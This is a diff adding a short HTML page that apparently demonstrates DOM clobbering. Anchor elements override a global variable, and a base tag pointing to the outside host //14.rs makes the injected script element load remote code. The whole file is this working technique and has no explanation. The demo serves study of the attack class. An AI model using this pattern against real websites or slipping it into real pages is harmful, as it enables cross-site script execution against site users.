@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>DOM Clobbering</h1>
+    <base href="//14.rs">
+    <div id="sameObject">sdf</div>
+ <a id="someObject">
+        <a name="url" id="someObject" href='//index.php:password@google.com'>test</a>
+    </a> 
+    <script>
+    window.onload = function(){
+        let someObject = window.someObject || {};
+        let script = document.createElement('script');
+        script.src = someObject.url.username;
+        document.body.appendChild(script);
+    };
+</script>
+</body>
+</html>
